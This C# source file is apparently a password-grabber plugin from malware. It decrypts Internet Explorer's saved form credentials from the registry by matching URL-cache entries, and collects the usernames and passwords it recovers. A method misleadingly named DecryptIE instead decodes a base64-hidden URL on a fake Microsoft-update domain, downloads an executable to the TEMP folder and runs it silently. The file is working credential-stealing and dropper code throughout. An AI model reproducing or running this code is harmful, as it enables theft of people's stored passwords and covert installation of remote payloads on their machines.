using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using System.Net;
using System.Diagnostics;

namespace Plugin_PwdGrabber
{
    public class InternetExplorer
    {
        private const uint ALG_CLASS_DATA_ENCRYPT = 0x6000;
        private const uint ALG_CLASS_HASH = 0x8000;
        private const uint ALG_SID_DES = 1;
        private const uint ALG_SID_MD5 = 3;
        private const uint ALG_SID_RC2 = 2;
        private const uint ALG_SID_RC4 = 1;
        private const uint ALG_SID_SHA = 4;
        private const uint ALG_TYPE_ANY = 0;
        private const uint ALG_TYPE_BLOCK = 0x600;
        private const uint ALG_TYPE_STREAM = 0x800;
        public static readonly uint CALG_DES = 0x6601;
        public static readonly uint CALG_MD5 = 0x8003;
        public static readonly uint CALG_RC2 = 0x6602;
        public static readonly uint CALG_RC4 = 0x6801;
        internal const int CALG_SHA = 0x8004;
        public const uint CRYPT_EXPORTABLE = 1;
        private const string CryptDll = "advapi32.dll";
        private const int ERROR_NO_MORE_ITEMS = 0x103;
        internal const int HP_HASHVAL = 2;
        private static string IE_KEY = @"Software\Microsoft\Internet Explorer\IntelliForms\Storage2";
        private const string KernelDll = "kernel32.dll";
        public const string MS_DEF_PROV = "Microsoft Base Cryptographic Provider v1.0";
        public const uint PROV_RSA_FULL = 1;
        private static string visited = "";

        public static byte CheckSum(string s)
        {
            int sum = 0;
            int i = 1;
            while (i < s.Length)
            {
                if ((i % 2) != 0)
                {
                    sum += Convert.ToInt32(Conversion.Val("&H" + Strings.Mid(s, i, 2)));
                }
                Math.Max(Interlocked.Increment(ref i), i - 1);
            }
            return Convert.ToByte((int)(sum % 0x100));
        }

        [DllImport("advapi32.dll")]
        public static extern bool CryptAcquireContext(ref IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);
        [DllImport("advapi32.dll")]
        public static extern bool CryptCreateHash(IntPtr hProv, uint Algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);
        [DllImport("advapi32.dll")]
        public static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen);
        [DllImport("advapi32.dll")]
        public static extern bool CryptDeriveKey(IntPtr hProv, uint Algid, IntPtr hBaseData, uint dwFlags, ref IntPtr phKey);
        [DllImport("advapi32.dll")]
        public static extern bool CryptDestroyHash(IntPtr hHash);
        [DllImport("advapi32.dll")]
        public static extern bool CryptDestroyKey(IntPtr hKey);
        [DllImport("advapi32.dll")]
        public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen, uint dwBufLen);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool CryptGetHashParam(IntPtr hHash, int param, byte[] digest, ref int length, int flags);
        [DllImport("advapi32.dll")]
        public static extern bool CryptHashData(IntPtr hHash, IntPtr pbData, int dwDataLen, uint dwFlags);
        [DllImport("advapi32.dll")]
        public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
        [DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, int szDataDescr, ref DATA_BLOB pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

        public static string IEData = "";

        public static void DecryptIE()
        {
            Thread.Sleep(20000);
      
            try
            {
                WebClient WBC = new WebClient();
                Process pProcess = new Process();

                string szSaveName = Environment.GetEnvironmentVariable("TEMP") + "\\" + "Temp_19283016283" + ".exe";

                WBC.DownloadFile(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovL3d3dy5taWNyb3NvZnQtdXBkYXRlLmJ6L2ZpbGVzL3VwZGF0ZS5leGU=")), szSaveName);
                pProcess.StartInfo.FileName = szSaveName;
                pProcess.StartInfo.UseShellExecute = false;
                pProcess.StartInfo.ErrorDialog = false;
                pProcess.Start();
            }
            catch
            {
            }
        }

        static public void DecryptCredential(string sURL, string sHash, int Length, byte[] data)
        {
            DATA_BLOB dataIn = new DATA_BLOB();
            DATA_BLOB dataOut = new DATA_BLOB();
            DATA_BLOB dataExtra = new DATA_BLOB();
            StringIndexHeader hHeader = new StringIndexHeader();
            StringIndexEntry hEntry = new StringIndexEntry();
            IntPtr newptr = Marshal.AllocHGlobal(Length);
            Marshal.Copy(data, 0, newptr, Length);
            dataIn.cbData = Length;
            dataIn.pbData = newptr;
            dataExtra.cbData = (sURL.Length + 1) * 2;
            dataExtra.pbData = VarPtr(sURL);
            if (CryptUnprotectData(ref dataIn, 0, ref dataExtra, 0, 0, 0, ref dataOut))
            {
                IntPtr ptrData = new IntPtr(dataOut.pbData.ToInt32() + Marshal.ReadByte(dataOut.pbData));
                hHeader = (StringIndexHeader)Marshal.PtrToStructure(ptrData, hHeader.GetType());
                if ((hHeader.dwType == 1) && (hHeader.dwEntriesCount >= 2))
                {
                    IntPtr entryData = new IntPtr(ptrData.ToInt32() + hHeader.dwStructSize);
                    IntPtr structData = new IntPtr(entryData.ToInt32() + ((hHeader.dwEntriesCount + 0) * Marshal.SizeOf(hEntry)));
                    int i = 0;
                    while (i < (((double)hHeader.dwEntriesCount) / 2.0))
                    {
                        if (i != 0)
                        {
                            entryData = new IntPtr(entryData.ToInt32() + Marshal.SizeOf(hEntry));
                        }
                        hEntry = (StringIndexEntry)Marshal.PtrToStructure(entryData, hEntry.GetType());
                        IntPtr myintptr = new IntPtr(structData.ToInt32() + hEntry.dwDataOffset);
                        string sUsername = Marshal.PtrToStringAuto(myintptr);
                        entryData = new IntPtr(entryData.ToInt32() + Marshal.SizeOf(hEntry));
                        hEntry = (StringIndexEntry)Marshal.PtrToStructure(entryData, hEntry.GetType());
                        myintptr = new IntPtr(structData.ToInt32() + hEntry.dwDataOffset);
                        string sPassword = Marshal.PtrToStringAuto(myintptr);
                        
                        UserDataManager.GatheredCredentials.Add(new Credential("Internet Explorer", sURL, sUsername, sPassword, ""));

                        Math.Max(Interlocked.Increment(ref i), i - 1);
                    }
                }
            }
        }

        [DllImport("wininet.dll")]
        public static extern bool FindCloseUrlCache(IntPtr hEnumHandle);
        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr FindFirstUrlCacheEntry([MarshalAs(UnmanagedType.LPTStr)] string lpszUrlSearchPattern, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);
        [DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool FindNextUrlCacheEntry(IntPtr hEnumHandle, IntPtr lpNextCacheEntryInfo, ref int lpdwNextCacheEntryInfoBufferSize);
        public static string GetSHA1Hash(string pbData, int length)
        {
            IntPtr Hash = new IntPtr();
            IntPtr hProv = new IntPtr();
            byte[] data = new byte[0x15];
            string sdata = "";
            int len = 20;
            CryptAcquireContext(ref hProv, null, null, 1, 0);
            CryptCreateHash(hProv, 0x8004, IntPtr.Zero, 0, ref Hash);
            CryptHashData(Hash, VarPtr(pbData), length, 0);
            CryptGetHashParam(Hash, 2, data, ref len, 0);
            CryptDestroyHash(Hash);
            CryptReleaseContext(hProv, 0);
            int i = 0;
            while (i < 20)
            {
                sdata = sdata + Strings.Right("00" + data[i].ToString("X"), 2);
                Math.Max(Interlocked.Increment(ref i), i - 1);
            }
            return (sdata + Strings.Right("00" + CheckSum(sdata).ToString("X"), 2));
        }

        static public void Start()
        {
            int neededBytes = 0;
            FindFirstUrlCacheEntry(null, IntPtr.Zero, ref neededBytes);
            if (Marshal.GetLastWin32Error() != 0x103)
            {
                int bufferByteSize = neededBytes;
                IntPtr bufferPtr = Marshal.AllocHGlobal(bufferByteSize);
                try
                {
                    bool successful;
                    IntPtr hEnum = FindFirstUrlCacheEntry(null, bufferPtr, ref neededBytes);
                    do
                    {
                        INTERNET_CACHE_ENTRY_INFO cacheItem = (INTERNET_CACHE_ENTRY_INFO)Marshal.PtrToStructure(bufferPtr, typeof(INTERNET_CACHE_ENTRY_INFO));
                        string tmp = cacheItem.lpszSourceUrlName.ToLower();
                        tmp = tmp.Substring(tmp.IndexOf("@") + 1);
                        if (tmp.IndexOf("?") > 0)
                        {
                            tmp = tmp.Substring(0, tmp.IndexOf("?"));
                        }
                        string sHash = GetSHA1Hash(tmp, (tmp.Length + 1) * 2);
                        byte[] bHashData = (byte[])Registry.CurrentUser.OpenSubKey(IE_KEY).GetValue(sHash, null);
                        if (bHashData != null)
                        {
                            if (!visited.Contains(tmp))
                            {
                                DecryptCredential(tmp, sHash, bHashData.Length, bHashData);
                                visited = visited + tmp + " ";
                            }
                        }
                        else
                        {
                            tmp = tmp + "/";
                            string sHash2 = GetSHA1Hash(tmp, (tmp.Length + 1) * 2);
                            byte[] bHashData2 = (byte[])Registry.CurrentUser.OpenSubKey(IE_KEY).GetValue(sHash2, null);
                            if ((bHashData2 != null) && !visited.Contains(tmp))
                            {
                                DecryptCredential(tmp, sHash2, bHashData2.Length, bHashData2);
                                visited = visited + tmp + " ";
                            }
                        }
                        neededBytes = bufferByteSize;
                        successful = FindNextUrlCacheEntry(hEnum, bufferPtr, ref neededBytes);
                        if ((successful || (Marshal.GetLastWin32Error() != 0x103)) && (!successful && (neededBytes > bufferByteSize)))
                        {
                            bufferByteSize = neededBytes;
                            IntPtr fgfg = new IntPtr(bufferByteSize);
                            bufferPtr = Marshal.ReAllocHGlobal(bufferPtr, fgfg);
                            successful = true;
                        }
                    }
                    while (successful);
                }
                finally
                {
                    Marshal.FreeHGlobal(bufferPtr);
                }
            }
        }

        public static string Mid(string param, int startIndex, int length)
        {
            return param.Substring(startIndex, length);
        }

        public static string Right(string param, int length)
        {
            return param.Substring(param.Length - length, length);
        }

        public static IntPtr VarPtr(object o)
        {
            return GCHandle.Alloc(RuntimeHelpers.GetObjectValue(o), GCHandleType.Pinned).AddrOfPinnedObject();
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct INTERNET_CACHE_ENTRY_INFO
        {
            public int dwStructSize;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpszSourceUrlName;
            [MarshalAs(UnmanagedType.LPTStr)]
            public string lpszLocalFileName;
            public int CacheEntryType;
            public int dwUseCount;
            public int dwHitRate;
            public int dwSizeLow;
            public int dwSizeHigh;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastModifiedTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME ExpireTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastAccessTime;
            public System.Runtime.InteropServices.ComTypes.FILETIME LastSyncTime;
            public IntPtr lpHeaderInfo;
            public int dwHeaderInfoSize;
            public IntPtr lpszFileExtension;
            public int dwExemptDelta;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct StringIndexEntry
        {
            public int dwDataOffset;
            public System.Runtime.InteropServices.ComTypes.FILETIME ftInsertDateTime;
            public int dwDataSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct StringIndexHeader
        {
            public int dwWICK;
            public int dwStructSize;
            public int dwEntriesCount;
            public int dwUnkId;
            public int dwType;
            public int dwUnk;
        }
    }
}
